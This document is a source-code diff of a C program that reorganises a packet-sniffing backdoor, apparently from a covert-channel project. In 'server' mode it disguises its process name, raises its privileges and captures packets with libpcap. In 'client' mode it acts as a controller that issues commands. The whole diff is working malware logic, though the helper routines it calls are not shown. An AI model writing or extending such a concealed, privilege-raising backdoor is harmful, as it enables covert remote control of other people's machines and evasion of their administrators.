@@ -33,18 +33,21 @@ void usage(char* program_name)
     printf("Usage: %s <mode>\n", program_name);
 }
 
-int start_server(char* program_name)
+int start(int argc, char** argv, Mode mode)
 {
-    if (mask_process(program_name, NEW_PROCESS_NAME) != 0)
+    if (mode == BACKDOOR)
     {
-        fprintf(stderr, "mask_process failed: %s\n", strerror(errno));
-        return -1;
-    }
+        if (mask_process(argv[0], NEW_PROCESS_NAME) != 0)
+        {
+            fprintf(stderr, "mask_process failed: %s\n", strerror(errno));
+            return -1;
+        }
 
-    if (raise_privileges(0) != 0)
-    {
-        fprintf(stderr, "raise_privileges: %s\n", strerror(errno));
-        return -1;
+        if (raise_privileges(0) != 0)
+        {
+            fprintf(stderr, "raise_privileges: %s\n", strerror(errno));
+            return -1;
+        }
     }
 
     pcap_if_t *alldevs, *temp;
@@ -56,8 +59,6 @@ int start_server(char* program_name)
 
     int i = 0;
     char errbuf[PCAP_ERRBUF_SIZE];
-
-    Mode mode = BACKDOOR;
 
     if (pcap_findalldevs(&alldevs, errbuf) == -1)
     {
@@ -104,6 +105,10 @@ int start_server(char* program_name)
         return -1;
     }
 
+    if (mode == CONTROLLER)
+    {
+        issue_command(argv[2], argv[3]);
+    }
     // Start capturing packets
     pcap_loop(session, 0, got_packet, (u_char*)&mode);
 
@@ -125,10 +130,6 @@ int start_client(int argc, char* argv[])
 
 
     // Receiving
-    if (fork() == 0)
-    {
-
-    }
 
     // Sending
     issue_command(argv[1], argv[2]);
@@ -136,6 +137,8 @@ int start_client(int argc, char* argv[])
 
 int main(int argc, char *argv[])
 {
+
+    Mode mode;
 
     if (argc < 2)
     {
@@ -147,19 +150,19 @@ int main(int argc, char *argv[])
     if (strcmp(argv[1], "client") == 0)
     {
         printf("Starting in client mode\n");
-        int args_left = argc - 1;
-        start_client(args_left, argv + 1);
+        mode = CONTROLLER;
+
     }
     else if (strcmp(argv[1], "server") == 0)
     {
         printf("Starting in server mode\n");
-        start_server(argv[0]);
+        mode = BACKDOOR;
     }
     else
     {
         usage(argv[0]);
         return -1;
     }
-
+    start(argc, argv, mode);
     return 0;
 }
